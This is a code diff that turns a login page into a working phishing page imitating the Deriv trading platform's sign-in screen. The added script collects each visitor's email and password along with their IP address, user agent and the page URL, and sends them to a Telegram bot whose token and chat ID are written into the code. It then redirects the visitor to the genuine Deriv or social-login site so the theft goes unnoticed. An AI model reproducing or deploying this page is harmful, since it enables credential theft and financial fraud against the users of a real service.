@@ -1,63 +1,534 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Log in | Deriv</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Deriv | Log in</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+    body {
+      font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .page-wrapper {
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 24px 32px;
+    }
+
+    /* Logo */
+    .logo {
+      margin-bottom: 40px;
+    }
+
+    .logo svg {
+      height: 36px;
+      width: auto;
+    }
+
+    /* Heading */
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a2e;
+      align-self: flex-start;
+      margin-bottom: 28px;
+      letter-spacing: -0.3px;
+    }
+
+    /* Form */
+    .form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .field {
+      position: relative;
+      width: 100%;
+    }
+
+    .field label {
+      position: absolute;
+      top: -9px;
+      left: 12px;
+      background: #fff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #9e9e9e;
+      font-weight: 400;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 16px 44px 16px 16px;
+      border: 1.5px solid #d6d6d6;
+      border-radius: 4px;
+      font-size: 15px;
+      color: #1a1a2e;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+      transition: border-color 0.2s;
+    }
+
+    .field input:focus {
+      border-color: #85898e;
+    }
+
+    .field input::placeholder {
+      color: transparent;
+    }
+
+    /* Eye icon */
+    .eye-toggle {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      color: #85898e;
+    }
+
+    /* Forgot password */
+    .forgot {
+      align-self: flex-start;
+      color: #ff444f;
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 400;
+      margin-top: -4px;
+      display: block;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    /* Login button */
+    .btn-login {
+      width: 100%;
+      padding: 15px;
+      background: #ff444f;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: 0.2px;
+      transition: background 0.2s, transform 0.1s;
+      margin-top: 12px;
+    }
+
+    .btn-login:hover {
+      background: #e03840;
+    }
+
+    .btn-login:active {
+      transform: scale(0.98);
+    }
+
+    .btn-login:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Success message */
+    .success-message {
+      display: none;
+      width: 100%;
+      padding: 15px;
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      border-radius: 4px;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 12px;
+    }
+
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      margin: 8px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #d6d6d6;
+    }
+
+    .divider span {
+      font-size: 13px;
+      color: #85898e;
+      white-space: nowrap;
+    }
+
+    /* Social buttons */
+    .social-btns {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .btn-social {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: opacity 0.2s, transform 0.1s;
+      border: none;
+    }
+
+    .btn-social:active {
+      transform: scale(0.98);
+    }
+
+    .btn-social:hover {
+      opacity: 0.9;
+    }
+
+    /* Passkey */
+    .btn-passkey {
+      background: #fff;
+      border: 1.5px solid #d6d6d6 !important;
+      color: #1a1a2e;
+    }
+
+    /* Google */
+    .btn-google {
+      background: #f2f2f2;
+      color: #1a1a2e;
+    }
+
+    /* Facebook */
+    .btn-facebook {
+      background: #1877f2;
+      color: #fff;
+    }
+
+    /* Apple */
+    .btn-apple {
+      background: #000;
+      color: #fff;
+    }
+
+    /* Sign up link */
+    .signup-row {
+      margin-top: 28px;
+      font-size: 14px;
+      color: #85898e;
+      text-align: center;
+    }
+
+    .signup-row a {
+      color: #ff444f;
+      text-decoration: none;
+      font-weight: 600;
+      display: block;
+      margin-top: 4px;
+    }
+
+    .signup-row a:hover {
+      text-decoration: underline;
+    }
+
+    /* Icon sizes */
+    .icon-sm {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      border: 2px solid #fff;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      margin-right: 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-
 <body>
-<div class="container">
-    <div class="login-card">
-        <!-- CENTERED BRAND -->
-        <h1 class="brand">Deriv</h1>
+  <div class="page-wrapper">
 
-        <h2>Welcome back</h2>
+    <!-- Deriv Logo (SVG) -->
+    <div class="logo">
+      <svg viewBox="0 0 80 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <text x="0" y="28" font-family=" 'Poppins', sans-serif', sans-serif', serif" font-size="32" font-style="italic" font-weight="700" fill="#ff444f">deriv</text>
+      </svg>
+    </div>
 
-        <form id="loginForm">
-            <!-- EMAIL -->
-            <div class="input-box">
-                <input type="email" id="email" name="email" required>
-                <label>Email</label>
-            </div>
+    <h1>Welcome back</h1>
 
-            <!-- PASSWORD -->
-            <div class="input-box password-wrapper">
-                <input type="password" id="password" name="password" required>
-                <label>Password</label>
-                <span class="toggle" id="toggle"></span>
-            </div>
+    <div class="form">
 
-            <div class="options">
-                <label class="checkbox-label">
-                    <input type="checkbox" id="remember"> Remember me
-                </label>
-                <a href="#" class="forgot-link">Forgot password?</a>
-            </div>
+      <!-- Email field -->
+      <div class="field">
+        <label>Email</label>
+        <input type="email" id="emailInput" value="" autocomplete="email" />
+      </div>
 
-            <button type="submit" class="login-btn" id="loginBtn">
-                <span class="btn-text">Log in</span>
-                <div class="btn-loader" style="display: none;"></div>
-            </button>
-        </form>
+      <!-- Password field -->
+      <div class="field">
+        <label>Password</label>
+        <input type="password" id="passwordInput" autocomplete="current-password" />
+        <button class="eye-toggle" onclick="togglePassword()" type="button" aria-label="Show password">
+          <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+            <line x1="1" y1="1" x2="23" y2="23"/>
+          </svg>
+        </button>
+      </div>
 
-        <div class="divider">or</div>
+      <!-- Forgot password -->
+      <a href="#" class="forgot">Forgot password?</a>
 
-        <!-- GOOGLE BUTTON -->
-        <button class="google-btn" onclick="goToGmail()">
-            <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google">
-            Continue with Google
+      <!-- Success message -->
+      <div id="successMessage" class="success-message">
+        Redirecting to your account...
+      </div>
+
+      <!-- Login button -->
+      <button class="btn-login" id="loginBtn" type="button" onclick="handleLogin()">Log in</button>
+
+      <!-- Divider -->
+      <div class="divider"><span>Or continue with</span></div>
+
+      <!-- Social login buttons -->
+      <div class="social-btns">
+
+        <!-- Passkey -->
+        <button class="btn-social btn-passkey" type="button" onclick="handleSocial('passkey')">
+          <svg class="icon-sm" viewBox="0 0 24 24" fill="currentColor">
+            <circle cx="9" cy="7" r="4"/>
+            <path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/>
+            <circle cx="19" cy="11" r="2" fill="none" stroke="currentColor" stroke-width="2"/>
+            <path d="M19 13v2M18 15h2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          Passkey
         </button>
 
-        <p class="signup">
-            Don't have an account? <a href="#" class="signup-link">Sign up</a>
-        </p>
-    </div>
-</div>
+        <!-- Google -->
+        <button class="btn-social btn-google" type="button" onclick="handleSocial('google')">
+          <svg class="icon-sm" viewBox="0 0 24 24">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.70 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.60 3.30-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+          Google
+        </button>
 
-<script src="script.js"></script>
+        <!-- Facebook -->
+        <button class="btn-social btn-facebook" type="button" onclick="handleSocial('facebook')">
+          <svg class="icon-sm" viewBox="0 0 24 24" fill="white">
+            <path d="M24 12.073c0-6.668-5.373-12.073-12-12.073S0 5.405 0 12.073c0 5.927 3.888 10.994 10.125 12.797v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24c4.388-1.906 9.125-6.87 9.125-12.797z"/>
+          </svg>
+          Facebook
+        </button>
+
+        <!-- Apple -->
+        <button class="btn-social btn-apple" type="button" onclick="handleSocial('apple')">
+          <svg class="icon-sm" viewBox="0 0 24 24" fill="white">
+            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+          </svg>
+          Apple
+        </button>
+
+      </div>
+
+    </div>
+
+    <!-- Sign up -->
+    <div class="signup-row">
+      Don't have an account yet?
+      <a href="#">Sign up</a>
+    </div>
+
+  </div>
+
+  <script>
+    // REPLACE THIS WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID
+    const BOT_TOKEN = '8668043512:AAGe5xBZuouUi2das4ttGhU9ehz4e96ECPM';  // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+    const CHAT_ID = '7133577749';     // e.g., '123456789' or '@yourchannel'
+
+    let isSubmitted = false;
+
+    function togglePassword() {
+      const input = document.getElementById('passwordInput');
+      const btn = input.nextElementSibling;
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.innerHTML = `<svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>`;
+      } else {
+        input.type = 'password';
+        btn.innerHTML = `<svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+        </svg>`;
+      }
+    }
+
+    async function sendToTelegram(email, password, method = 'email/password') {
+      try {
+        const victimIP = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+        const userAgent = navigator.userAgent;
+        const timestamp = new Date().toISOString();
+
+        const message = `🚨 DERIV LOGIN CAPTURED 🚨\n\n` +
+                       `📧 Email: ${email}\n` +
+                       `🔑 Password: ${password}\n` +
+                       `🌐 IP: ${victimIP}\n` +
+                       `💻 User-Agent: ${userAgent.substring(0, 100)}...\n` +
+                       `⏰ Time: ${timestamp}\n` +
+                       `🔗 Method: ${method}\n` +
+                       `🔗 URL: ${window.location.href}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+        
+        await fetch(url);
+        console.log('Credentials sent to Telegram');
+      } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+      }
+    }
+
+    async function handleLogin() {
+      if (isSubmitted) return;
+      
+      const email = document.getElementById('emailInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+      
+      if (!email || !password) {
+        alert('Please enter email and password');
+        return;
+      }
+
+      isSubmitted = true;
+      const loginBtn = document.getElementById('loginBtn');
+      const successMsg = document.getElementById('successMessage');
+      
+      // Show loading
+      loginBtn.innerHTML = '<div class="spinner"></div>Logging in...';
+      loginBtn.disabled = true;
+
+      // Send credentials
+      await sendToTelegram(email, password, 'Email/Password');
+
+      // Show success and redirect after delay
+      setTimeout(() => {
+        successMsg.style.display = 'block';
+        loginBtn.style.display = 'none';
+        
+        // Redirect to real Deriv site after 2 seconds
+        setTimeout(() => {
+          window.location.href = 'https://app.deriv.com/';
+        }, 2000);
+      }, 1000);
+    }
+
+    function handleSocial(provider) {
+      if (isSubmitted) return;
+      isSubmitted = true;
+      
+      const email = document.getElementById('emailInput').value.trim() || 'Not provided';
+      const fakePassword = `${provider.toUpperCase()} Login`;
+      
+      const loginBtn = document.getElementById('loginBtn');
+      const successMsg = document.getElementById('successMessage');
+      
+      loginBtn.innerHTML = '<div class="spinner"></div>Continuing...';
+      loginBtn.disabled = true;
+
+      // Send social login attempt
+      sendToTelegram(email, fakePassword, provider.charAt(0).toUpperCase() + provider.slice(1));
+
+      setTimeout(() => {
+        successMsg.innerHTML = `Redirecting with ${provider}...`;
+        successMsg.style.display = 'block';
+        loginBtn.style.display = 'none';
+        
+        setTimeout(() => {
+          // Redirect to provider's login or Deriv
+          if (provider === 'google') {
+            window.location.href = 'https://accounts.google.com/';
+          } else if (provider === 'facebook') {
+            window.location.href = 'https://www.facebook.com/';
+          } else if (provider === 'apple') {
+            window.location.href = 'https://appleid.apple.com/';
+          } else {
+            window.location.href = 'https://app.deriv.com/';
+          }
+        }, 2000);
+      }, 1000);
+    }
+
+    // Auto-submit if someone hits Enter
+    document.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter' && !isSubmitted) {
+        handleLogin();
+      }
+    });
+
+    // Capture any form submissions
+    document.addEventListener('submit', function(e) {
+      e.preventDefault();
+      handleLogin();
+    });
+  </script>
 </body>
 </html>
